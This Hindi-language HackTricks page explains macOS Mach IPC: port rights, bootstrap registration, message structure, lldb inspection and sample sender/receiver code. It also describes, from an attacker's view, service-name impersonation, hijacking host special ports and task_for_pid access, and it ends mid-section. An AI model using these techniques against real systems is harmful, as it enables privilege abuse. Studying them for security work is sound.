# macOS IPC - Inter Process Communication

{{#include ../../../../banners/hacktricks-training.md}}

## Ports के माध्यम से Mach messaging

### Basic Information

Mach resources साझा करने के लिए **tasks** को **सबसे छोटी इकाई** के रूप में उपयोग करता है, और प्रत्येक task में **कई threads** हो सकते हैं। ये **tasks और threads POSIX processes और threads से 1:1 mapped** होते हैं।

Tasks के बीच communication Mach Inter-Process Communication (IPC) के माध्यम से होता है, जिसमें one-way communication channels का उपयोग किया जाता है। **Messages को ports के बीच transfer किया जाता है**, जो kernel द्वारा managed **message queues** की तरह कार्य करते हैं।

एक **port**, Mach IPC का **basic** element है। इसका उपयोग **messages भेजने और receive करने** के लिए किया जा सकता है।

प्रत्येक process में एक **IPC table** होती है, जिसमें process के **mach ports** देखे जा सकते हैं। mach port का नाम वास्तव में एक number होता है (kernel object का pointer)।

एक process किसी port name को कुछ rights के साथ **किसी दूसरे task** को भी भेज सकता है और kernel, दूसरे task की **IPC table** में इस entry को दिखा देगा।

### Port Rights

Port rights, जो यह निर्धारित करते हैं कि कोई task कौन-से operations कर सकता है, इस communication के लिए महत्वपूर्ण हैं। संभावित **port rights** ये हैं ([definitions from here](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):<sup>[[1]](#references)</sup>

- **Receive right**, जो port को भेजे गए messages को receive करने की अनुमति देता है। Mach ports MPSC (multiple-producer, single-consumer) queues होते हैं, जिसका अर्थ है कि पूरे system में प्रत्येक **port के लिए केवल एक receive right** हो सकता है (pipes के विपरीत, जहाँ कई processes एक ही pipe के read end के file descriptors रख सकते हैं)।
- **Receive** right वाला **task** messages receive कर सकता है और **Send rights create** कर सकता है, जिससे वह messages भेज सकता है। मूल रूप से केवल **अपने task के पास उसके port पर Receive right** होता है।
- यदि Receive right का owner **मर जाता है** या उसे समाप्त कर देता है, तो **send right बेकार हो जाता है (dead name)।**
- **Send right**, जो port पर messages भेजने की अनुमति देता है।
- Send right को **clone** किया जा सकता है, इसलिए Send right वाला task इस right को clone करके **किसी तीसरे task को दे सकता है**।
- ध्यान दें कि **port rights** को Mach messages के माध्यम से **pass** भी किया जा सकता है।
- **Send-once right**, जो port पर एक message भेजने की अनुमति देता है और फिर समाप्त हो जाता है।
- इस right को **clone** नहीं किया जा सकता, लेकिन इसे **move** किया जा सकता है।
- **Port set right**, जो किसी एक port के बजाय एक _port set_ को दर्शाता है। Port set से message dequeue करने पर उसके किसी एक port से message dequeue होता है। Port sets का उपयोग एक साथ कई ports पर listen करने के लिए किया जा सकता है, Unix में `select`/`poll`/`epoll`/`kqueue` की तरह।
- **Dead name**, जो वास्तविक port right नहीं है, बल्कि केवल एक placeholder है। जब कोई port destroy होता है, तो उस port के सभी मौजूदा port rights dead names में बदल जाते हैं।

**Tasks दूसरों को SEND rights transfer कर सकते हैं**, जिससे वे उन्हें वापस messages भेज सकें। **SEND rights को clone भी किया जा सकता है, इसलिए कोई task इस right को duplicate करके किसी तीसरे task को दे सकता है**। यह, **bootstrap server** नामक intermediary process के साथ मिलकर, tasks के बीच प्रभावी communication की अनुमति देता है।

### File Ports

File ports, file descriptors को Mach ports में (Mach port rights का उपयोग करके) encapsulate करने की अनुमति देते हैं। किसी दिए गए file descriptor से `fileport_makeport` के माध्यम से `fileport` बनाना और `fileport` से `fileport_makefd` के माध्यम से file descriptor बनाना संभव है।

### Communication स्थापित करना

जैसा कि पहले बताया गया है, Mach messages का उपयोग करके rights भेजना संभव है, हालांकि Mach message भेजने के लिए **आपके पास पहले से ही कोई right होना आवश्यक है**। तो, पहला communication कैसे स्थापित किया जाता है?

इसके लिए **bootstrap server** (**macOS में** `launchd`) शामिल होता है। चूँकि **हर कोई bootstrap server के लिए SEND right प्राप्त कर सकता है**, इसलिए उससे किसी अन्य process को message भेजने का right माँगा जा सकता है:

1. Task **A** एक **नया port** बनाता है और उस पर **RECEIVE right** प्राप्त करता है।
2. Task **A**, RECEIVE right के holder के रूप में, **उस port के लिए SEND right generate** करता है।
3. Task **A**, **bootstrap server** के साथ एक **connection स्थापित** करता है और शुरुआत में generate किए गए port का **SEND right उसे भेजता है**।
- याद रखें कि कोई भी व्यक्ति bootstrap server के लिए SEND right प्राप्त कर सकता है।
4. Task A, bootstrap server को `bootstrap_register` message भेजकर दिए गए port को `com.apple.taska` जैसे **नाम के साथ associate** करता है।
5. Task **B**, service name (`bootstrap_lookup`) के लिए bootstrap **lookup** execute करने हेतु **bootstrap server** के साथ interact करता है। Server response दे सके, इसके लिए task B lookup message के अंदर उसे **पहले बनाए गए एक port का SEND right** भेजता है। यदि lookup सफल होता है, तो **server**, Task A से प्राप्त SEND right को duplicate करके **Task B को transmit** करता है।
- याद रखें कि कोई भी व्यक्ति bootstrap server के लिए SEND right प्राप्त कर सकता है।
6. इस SEND right के साथ **Task B**, **Task A को** एक **message भेजने** में सक्षम होता है।
7. Bi-directional communication के लिए आमतौर पर task **B**, **RECEIVE** right और **SEND** right वाला एक नया port generate करता है और **SEND right Task A को देता है**, ताकि वह TASK B को messages भेज सके (bi-directional communication)।

Bootstrap server किसी task द्वारा claim किए गए service name को **authenticate नहीं कर सकता**। इसका अर्थ है कि कोई **task** संभावित रूप से **किसी भी system task का impersonate** कर सकता है, जैसे झूठा **authorization service name claim** करके हर request को approve करना।

इसके बाद, Apple **system-provided services के names** को secure configuration files में store करता है, जो **SIP-protected** directories में स्थित होती हैं: `/System/Library/LaunchDaemons` और `/System/Library/LaunchAgents`। प्रत्येक service name के साथ **associated binary भी store** होती है। Bootstrap server प्रत्येक service name के लिए **RECEIVE right create और hold** करेगा।

इन predefined services के लिए **lookup process थोड़ा अलग** होता है। जब किसी service name को lookup किया जाता है, तो launchd service को dynamically start करता है। नया workflow इस प्रकार है:

- Task **B**, किसी service name के लिए bootstrap **lookup** शुरू करता है।
- **launchd** जाँचता है कि task चल रहा है या नहीं; यदि नहीं चल रहा हो, तो उसे **start** करता है।
- Task **A** (service), **bootstrap check-in** (`bootstrap_check_in()`) करता है। यहाँ **bootstrap server एक SEND right create करके retain करता है और RECEIVE right को Task A को transfer** करता है।
- launchd **SEND right को duplicate करके Task B को भेजता है**।
- Task **B**, **RECEIVE** right और **SEND** right वाला एक नया port generate करता है और **SEND right Task A** (svc) को देता है, ताकि वह TASK B को messages भेज सके (bi-directional communication)।

हालाँकि, यह process केवल predefined system tasks पर लागू होता है। Non-system tasks अभी भी पहले बताए गए तरीके से operate करते हैं, जिससे संभावित रूप से impersonation की अनुमति मिल सकती है।

> [!CAUTION]
> इसलिए, launchd को कभी crash नहीं होना चाहिए, अन्यथा पूरा system crash हो जाएगा।

### A Mach Message

[Find more info here](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)<sup>[[4]](#references)</sup>

`mach_msg` function, जो मूल रूप से एक system call है, Mach messages भेजने और receive करने के लिए उपयोग किया जाता है। इस function को पहले argument के रूप में भेजा जाने वाला message चाहिए। यह message `mach_msg_header_t` structure से शुरू होना चाहिए, जिसके बाद वास्तविक message content आता है। Structure इस प्रकार define की गई है:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
_**receive right**_ रखने वाली Processes किसी Mach port पर messages receive कर सकती हैं। इसके विपरीत, **senders** को _**send**_ या _**send-once right**_ दिया जाता है। send-once right का उपयोग केवल एक message भेजने के लिए किया जाता है, जिसके बाद यह invalid हो जाता है।<sup>[[11]](#references)</sup>

प्रारंभिक field **`msgh_bits`** एक bitmap है:

- पहला bit (सबसे significative) यह दर्शाने के लिए उपयोग किया जाता है कि message complex है (इस पर नीचे और जानकारी दी गई है)
- तीसरे और चौथे bits का उपयोग kernel द्वारा किया जाता है
- दूसरे byte के **5 least significant bits** का उपयोग **voucher** के लिए किया जा सकता है: key/value combinations भेजने के लिए एक अन्य प्रकार का port।
- तीसरे byte के **5 least significant bits** का उपयोग **local port** के लिए किया जा सकता है
- चौथे byte के **5 least significant bits** का उपयोग **remote port** के लिए किया जा सकता है

voucher, local और remote ports में निर्दिष्ट किए जा सकने वाले types ([**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html) से) हैं:<sup>[[5]](#references)</sup>
```c
#define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
#define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MOVE_SEND_ONCE    18      /* Must hold sendonce right */
#define MACH_MSG_TYPE_COPY_SEND         19      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MAKE_SEND         20      /* Must hold receive right */
#define MACH_MSG_TYPE_MAKE_SEND_ONCE    21      /* Must hold receive right */
#define MACH_MSG_TYPE_COPY_RECEIVE      22      /* NOT VALID */
#define MACH_MSG_TYPE_DISPOSE_RECEIVE   24      /* must hold receive right */
#define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
#define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
```
उदाहरण के लिए, `MACH_MSG_TYPE_MAKE_SEND_ONCE` का उपयोग यह **संकेत देने** के लिए किया जा सकता है कि इस port के लिए एक **send-once** **right** derive और transfer किया जाना चाहिए। recipient को reply करने में सक्षम होने से रोकने के लिए `MACH_PORT_NULL` भी निर्दिष्ट किया जा सकता है।

आसान **bi-directional communication** प्राप्त करने के लिए, कोई process mach **message header** में एक **mach port** निर्दिष्ट कर सकता है, जिसे _reply port_ (**`msgh_local_port`**) कहा जाता है, जहाँ message का **receiver** इस message का **reply भेज** सकता है।

> [!TIP]
> ध्यान दें कि इस प्रकार का bi-directional communication उन XPC messages में उपयोग किया जाता है जिनमें reply अपेक्षित होता है (`xpc_connection_send_message_with_reply` और `xpc_connection_send_message_with_reply_sync`)। लेकिन **आमतौर पर अलग-अलग ports बनाए जाते हैं**, जैसा कि पहले समझाया गया है, ताकि bi-directional communication बनाया जा सके।

message header के अन्य fields हैं:

- `msgh_size`: पूरे packet का size।
- `msgh_remote_port`: वह port जिस पर यह message भेजा जाता है।
- `msgh_voucher_port`: [mach vouchers](https://robert.sesek.com/2023/6/mach_vouchers.html)।
- `msgh_id`: इस message की ID, जिसकी व्याख्या receiver करता है।

> [!CAUTION]
> ध्यान दें कि **mach messages एक `mach port` पर भेजे जाते हैं**, जो mach kernel में निर्मित **single receiver**, **multiple sender** communication channel है। **Multiple processes** किसी mach port पर **messages भेज** सकते हैं, लेकिन किसी भी समय केवल **एक process ही** उससे पढ़ सकता है।

Messages पहले **`mach_msg_header_t`** header, उसके बाद **body** और फिर **trailer** (यदि कोई हो) से बनते हैं और यह reply करने की permission दे सकते हैं। इन मामलों में, kernel को केवल message को एक task से दूसरे task तक पहुँचाना होता है।

एक **trailer**, **kernel द्वारा message में जोड़ी गई information** है (जिसे user set नहीं कर सकता), जिसे message reception के दौरान `MACH_RCV_TRAILER_<trailer_opt>` flags के साथ request किया जा सकता है (अलग-अलग information request की जा सकती है)।

#### Complex Messages

हालाँकि, कुछ अन्य अधिक **complex** messages भी होते हैं, जैसे additional port rights पास करने या memory share करने वाले messages, जिनमें kernel को इन objects को recipient तक भेजना भी आवश्यक होता है। इन मामलों में header के `msgh_bits` का सबसे significant bit set होता है।

पास किए जा सकने वाले संभावित descriptors [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html) में defined हैं:<sup>[[5]](#references)</sup>
```c
#define MACH_MSG_PORT_DESCRIPTOR                0
#define MACH_MSG_OOL_DESCRIPTOR                 1
#define MACH_MSG_OOL_PORTS_DESCRIPTOR           2
#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR        3
#define MACH_MSG_GUARDED_PORT_DESCRIPTOR        4

#pragma pack(push, 4)

typedef struct{
natural_t                     pad1;
mach_msg_size_t               pad2;
unsigned int                  pad3 : 24;
mach_msg_descriptor_type_t    type : 8;
} mach_msg_type_descriptor_t;
```
32bits में, सभी descriptors 12B के होते हैं और descriptor type 11वें वाले में होता है। 64 bits में, sizes अलग-अलग होते हैं।

> [!CAUTION]
> Kernel एक task से दूसरे task में descriptors को copy करेगा, लेकिन पहले **kernel memory में एक copy बनाकर**। यह technique, जिसे "Feng Shui" के नाम से जाना जाता है, कई exploits में इस तरह abuse की गई है कि **kernel अपने memory में data copy करे**, जिसमें कोई process descriptors खुद को भेजता है। इसके बाद process messages receive कर सकता है (kernel उन्हें free कर देगा)।
>
> **किसी vulnerable process को port rights भेजना भी संभव है**, और port rights process में बस दिखाई देने लगेंगे (भले ही वह उन्हें handle न कर रहा हो)।

### Mac Ports APIs

ध्यान दें कि ports task namespace से associated होते हैं, इसलिए किसी port को create या search करने के लिए task namespace को भी query किया जाता है (अधिक जानकारी `mach/mach_port.h` में):<sup>[[6]](#references)</sup>

- **`mach_port_allocate` | `mach_port_construct`**: **एक port create करें।**
- `mach_port_allocate` एक **port set** भी create कर सकता है: ports के group पर receive right। जब भी कोई message receive होता है, तो यह बताया जाता है कि वह किस port से आया है।
- `mach_port_allocate_name`: port का name बदलें (default रूप से 32bit integer)
- `mach_port_names`: किसी target से port names प्राप्त करें
- `mach_port_type`: किसी name पर task के rights प्राप्त करें
- `mach_port_rename`: किसी port का नाम बदलें (FDs के लिए dup2 की तरह)
- `mach_port_allocate`: नया RECEIVE, PORT_SET या DEAD_NAME allocate करें
- `mach_port_insert_right`: जिस port पर आपके पास RECEIVE है, उसमें नया right create करें
- `mach_port_...`
- **`mach_msg`** | **`mach_msg_overwrite`**: **mach messages भेजने और receive करने के लिए उपयोग किए जाने वाले functions**। overwrite version message reception के लिए अलग buffer specify करने की अनुमति देता है (दूसरा version उसी buffer को reuse करेगा)।

### Debug mach_msg

क्योंकि **`mach_msg`** और **`mach_msg_overwrite`** वे functions हैं जिनका उपयोग messages भेजने और receive करने के लिए किया जाता है, इन पर breakpoint set करने से भेजे और receive किए गए messages को inspect किया जा सकता है।

उदाहरण के लिए, किसी भी ऐसी application को debug करना शुरू करें जिसे आप debug कर सकते हैं, क्योंकि यह **`libSystem.B` load करेगी, जो इस function का उपयोग करेगी**।

<pre class="language-armasm"><code class="lang-armasm"><strong>(lldb) b mach_msg
</strong>Breakpoint 1: where = libsystem_kernel.dylib`mach_msg, address = 0x00000001803f6c20
<strong>(lldb) r
</strong>Process 71019 launched: '/Users/carlospolop/Desktop/sandboxedapp/SandboxedShellAppDown.app/Contents/MacOS/SandboxedShellApp' (arm64)
Process 71019 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
libsystem_kernel.dylib`mach_msg:
->  0x181d3ac20 <+0>:  pacibsp
0x181d3ac24 <+4>:  sub    sp, sp, #0x20
0x181d3ac28 <+8>:  stp    x29, x30, [sp, #0x10]
0x181d3ac2c <+12>: add    x29, sp, #0x10
Target 0: (SandboxedShellApp) stopped.
<strong>(lldb) bt
</strong>* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
frame #1: 0x0000000181ac3454 libxpc.dylib`_xpc_pipe_mach_msg + 56
frame #2: 0x0000000181ac2c8c libxpc.dylib`_xpc_pipe_routine + 388
frame #3: 0x0000000181a9a710 libxpc.dylib`_xpc_interface_routine + 208
frame #4: 0x0000000181abbe24 libxpc.dylib`_xpc_init_pid_domain + 348
frame #5: 0x0000000181abb398 libxpc.dylib`_xpc_uncork_pid_domain_locked + 76
frame #6: 0x0000000181abbbfc libxpc.dylib`_xpc_early_init + 92
frame #7: 0x0000000181a9583c libxpc.dylib`_libxpc_initializer + 1104
frame #8: 0x000000018e59e6ac libSystem.B.dylib`libSystem_initializer + 236
frame #9: 0x0000000181a1d5c8 dyld`invocation function for block in dyld4::Loader::findAndRunAllInitializers(dyld4::RuntimeState&) const::$_0::operator()() const + 168
</code></pre>

**`mach_msg`** के arguments प्राप्त करने के लिए registers check करें। ये arguments हैं ([mach/message.h](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html) से):
```c
__WATCHOS_PROHIBITED __TVOS_PROHIBITED
extern mach_msg_return_t        mach_msg(
mach_msg_header_t *msg,
mach_msg_option_t option,
mach_msg_size_t send_size,
mach_msg_size_t rcv_size,
mach_port_name_t rcv_name,
mach_msg_timeout_t timeout,
mach_port_name_t notify);
```
रजिस्ट्री से मान प्राप्त करें:
```armasm
reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
x1 = 0x0000000003114207 ;mach_msg_option_t (option)
x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
x6 = 0x0000000000000000 ;mach_port_name_t (notify)
```
पहले argument की जाँच करते हुए message header का निरीक्षण करें:
```armasm
(lldb) x/6w $x0
0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
0x124e04cf8: 0x00000b07 0x40000322

; 0x00131513 -> mach_msg_bits_t (msgh_bits) = 0x13 (MACH_MSG_TYPE_COPY_SEND) in local | 0x1500 (MACH_MSG_TYPE_MAKE_SEND_ONCE) in remote | 0x130000 (MACH_MSG_TYPE_COPY_SEND) in voucher
; 0x00000388 -> mach_msg_size_t (msgh_size)
; 0x00000807 -> mach_port_t (msgh_remote_port)
; 0x00001f03 -> mach_port_t (msgh_local_port)
; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
; 0x40000322 -> mach_msg_id_t (msgh_id)
```
इस प्रकार का `mach_msg_bits_t` reply की अनुमति देने के लिए बहुत सामान्य है।

### पोर्ट्स की गणना करें
```bash
lsmp -p <pid>

sudo lsmp -p 1
Process (1) : launchd
name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  qlimit  msgcount  context            identifier  type
---------   ----------  ----------  -------- -----  ---- ----- ----- ----- ----  ------  --------  ------------------ ----------- ------------
0x00000203  0x181c4e1d  send        --------        ---            2                                                  0x00000000  TASK-CONTROL SELF (1) launchd
0x00000303  0x183f1f8d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x00000403  0x183eb9dd  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000051b  0x1840cf3d  send        --------        ---            2        ->        6         0  0x0000000000000000 0x00011817  (380) WindowServer
0x00000603  0x183f698d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000070b  0x175915fd  recv,send   ---GS---     0  ---      1     2         Y        5         0  0x0000000000000000
0x00000803  0x1758794d  send        --------        ---            1                                                  0x00000000  CLOCK
0x0000091b  0x192c71fd  send        --------        D--            1        ->        1         0  0x0000000000000000 0x00028da7  (418) runningboardd
0x00000a6b  0x1d4a18cd  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00006a03  (92247) Dock
0x00000b03  0x175a5d4d  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00001803  (310) logd
[...]
0x000016a7  0x192c743d  recv,send   --TGSI--     0  ---      1     1         Y       16         0  0x0000000000000000
+     send        --------        ---            1         <-                                       0x00002d03  (81948) seserviced
+     send        --------        ---            1         <-                                       0x00002603  (74295) passd
[...]
```
**name** port को दिया गया default name है (ध्यान दें कि यह पहले 3 bytes में कैसे **increasing** है)। **`ipc-object`** port का **obfuscated** unique **identifier** है।\
यह भी ध्यान दें कि केवल **`send`** right वाले ports उसके **owner** (port name + pid) की पहचान कर रहे हैं।\
साथ ही, उसी port से जुड़े **other tasks** को दर्शाने के लिए **`+`** के उपयोग पर ध्यान दें।

**registered service names** देखने के लिए [**procesxp**](https://www.newosxbook.com/tools/procexp.html) का उपयोग करना भी संभव है (SIP disabled होना आवश्यक है क्योंकि `com.apple.system-task-port` की जरूरत होती है):
```
procesp 1 ports
```
आप इस tool को iOS में [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz) डाउनलोड करके install कर सकते हैं।

### कोड उदाहरण

ध्यान दें कि **sender** किस तरह एक port **allocates** करता है, `org.darlinghq.example` नाम के लिए एक **send right** बनाता है और उसे **bootstrap server** को भेजता है, जबकि sender उस नाम का **send right** मांगता है और उसका उपयोग **message भेजने** के लिए करता है।<sup>[[1]](#references)</sup>

{{#tabs}}
{{#tab name="receiver.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{{#endtab}}

{{#tab name="sender.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{{#endtab}}
{{#endtabs}}

## Privileged Ports

कुछ विशेष ports किसी task को **कुछ संवेदनशील actions करने या कुछ संवेदनशील data तक access प्राप्त करने** की अनुमति देते हैं, जब उसके पास उन पर **SEND** rights होते हैं। ये ports attacker के दृष्टिकोण से capabilities और **tasks के बीच SEND rights share करने की क्षमता**, दोनों के कारण महत्वपूर्ण हैं।

### Host Special Ports

इन ports को एक number द्वारा दर्शाया जाता है।

**SEND** rights **`host_get_special_port`** को call करके प्राप्त किए जा सकते हैं और **RECEIVE** rights **`host_set_special_port`** को call करके। हालांकि, दोनों calls के लिए **`host_priv`** port आवश्यक है, जिसे केवल root access कर सकता है। इसके अलावा, पहले root **`host_set_special_port`** को call करके arbitrary ports को hijack कर सकता था, जिससे उदाहरण के लिए `HOST_KEXTD_PORT` को hijack करके code signatures को bypass करना संभव था (अब SIP इसे रोकता है)।

इन्हें 2 groups में विभाजित किया गया है: **पहले 7 ports kernel के ownership में हैं**—1 `HOST_PORT`, 2 `HOST_PRIV_PORT`, 3 `HOST_IO_MASTER_PORT` और 7 `HOST_MAX_SPECIAL_KERNEL_PORT` है।\
Number **8** से **आगे** शुरू होने वाले ports **system daemons के ownership में हैं** और इन्हें [**`host_special_ports.h`**](https://opensource.apple.com/source/xnu/xnu-4570.1.46/osfmk/mach/host_special_ports.h.auto.html) में declared पाया जा सकता है।

- **Host port**: यदि किसी process के पास इस port पर **SEND** privilege है, तो वह इसकी routines को call करके **system के बारे में information** प्राप्त कर सकता है, जैसे:
- `host_processor_info`: Processor info प्राप्त करें
- `host_info`: Host info प्राप्त करें
- `host_virtual_physical_table_info`: Virtual/Physical page table (MACH_VMDEBUG आवश्यक)
- `host_statistics`: Host statistics प्राप्त करें
- `mach_memory_info`: Kernel memory layout प्राप्त करें
- **Host Priv port**: इस port पर **SEND** right वाला process **privileged actions** कर सकता है, जैसे boot data दिखाना या kernel extension load करने का प्रयास करना। यह permission प्राप्त करने के लिए **process का root होना आवश्यक है**।
- इसके अलावा, **`kext_request`** API को call करने के लिए अन्य entitlements **`com.apple.private.kext*`** आवश्यक हैं, जो केवल Apple binaries को दिए जाते हैं।
- अन्य routines जिन्हें call किया जा सकता है:
- `host_get_boot_info`: `machine_boot_info()` प्राप्त करें
- `host_priv_statistics`: Privileged statistics प्राप्त करें
- `vm_allocate_cpm`: Contiguous Physical Memory allocate करें
- `host_processors`: Host processors को SEND right दें
- `mach_vm_wire`: Memory को resident बनाएं
- चूंकि **root** इस permission को access कर सकता है, इसलिए वह **host special या exception ports को hijack** करने के लिए `host_set_[special/exception]_port[s]` को call कर सकता है।

सभी host special ports को यह command चलाकर **देखना** संभव है:
```bash
procexp all ports | grep "HSP"
```
### Task Special Ports

ये पोर्ट well-known services के लिए reserved होते हैं। `task_[get/set]_special_port` को call करके इन्हें get/set किया जा सकता है। इन्हें `task_special_ports.h` में पाया जा सकता है:
```c
typedef	int	task_special_port_t;

#define TASK_KERNEL_PORT	1	/* Represents task to the outside
world.*/
#define TASK_HOST_PORT		2	/* The host (priv) port for task.  */
#define TASK_BOOTSTRAP_PORT	4	/* Bootstrap environment for task. */
#define TASK_WIRED_LEDGER_PORT	5	/* Wired resource ledger for task. */
#define TASK_PAGED_LEDGER_PORT	6	/* Paged resource ledger for task. */
```
From [here](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html):<sup>[[8]](#references)</sup>

- **TASK_KERNEL_PORT**\[task-self send right]: इस task को नियंत्रित करने के लिए उपयोग किया जाने वाला port। इसका उपयोग task को प्रभावित करने वाले messages भेजने के लिए किया जाता है। यही वह port है जिसे **mach_task_self (see Task Ports below)** लौटाता है।
- **TASK_BOOTSTRAP_PORT**\[bootstrap send right]: task का bootstrap port। इसका उपयोग अन्य system service ports लौटाने का अनुरोध करने वाले messages भेजने के लिए किया जाता है।
- **TASK_HOST_NAME_PORT**\[host-self send right]: containing host की जानकारी का अनुरोध करने के लिए उपयोग किया जाने वाला port। यही वह port है जिसे **mach_host_self** लौटाता है।
- **TASK_WIRED_LEDGER_PORT**\[ledger send right]: उस source को नाम देने वाला port, जहाँ से यह task अपनी wired kernel memory प्राप्त करता है।
- **TASK_PAGED_LEDGER_PORT**\[ledger send right]: उस source को नाम देने वाला port, जहाँ से यह task अपनी default memory-managed memory प्राप्त करता है।

### Task Ports

मूल रूप से Mach में "processes" नहीं थे, बल्कि "tasks" थे, जिन्हें threads के container के रूप में अधिक माना जाता था। जब Mach को BSD के साथ merge किया गया, **हर task को एक BSD process के साथ correlate किया गया**। इसलिए हर BSD process में process बनने के लिए आवश्यक details होती हैं और हर Mach task में भी अपनी internal workings होती हैं (गैर-मौजूद pid 0 को छोड़कर, जो `kernel_task` है)।

इससे संबंधित दो बहुत interesting functions हैं:<sup>[[7]](#references)</sup>

- `task_for_pid(target_task_port, pid, &task_port_of_pid)`: दिए गए `pid` से संबंधित task के लिए एक SEND right प्राप्त करें और उसे निर्दिष्ट `target_task_port` को दें (जो आमतौर पर caller task होता है, जिसने `mach_task_self()` का उपयोग किया है, लेकिन किसी अलग task पर मौजूद SEND port भी हो सकता है)।
- `pid_for_task(task, &pid)`: किसी task के SEND right को देखते हुए पता लगाएँ कि यह task किस PID से संबंधित है।

Task के भीतर actions करने के लिए, task को `mach_task_self()` call करके अपने लिए एक `SEND` right चाहिए था (जो `task_self_trap` (28) का उपयोग करता है)। इस permission के साथ task कई actions कर सकता है, जैसे:

- `task_threads`: task के threads के सभी task ports पर SEND right प्राप्त करें
- `task_info`: किसी task की info प्राप्त करें
- `task_suspend/resume`: किसी task को suspend या resume करें
- `task_[get/set]_special_port`
- `thread_create`: एक thread बनाएँ
- `task_[get/set]_state`: task state को नियंत्रित करें
- और भी बहुत कुछ [**mach/task.h**](https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX11.3.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/mach/task.h) में पाया जा सकता है

> [!CAUTION]
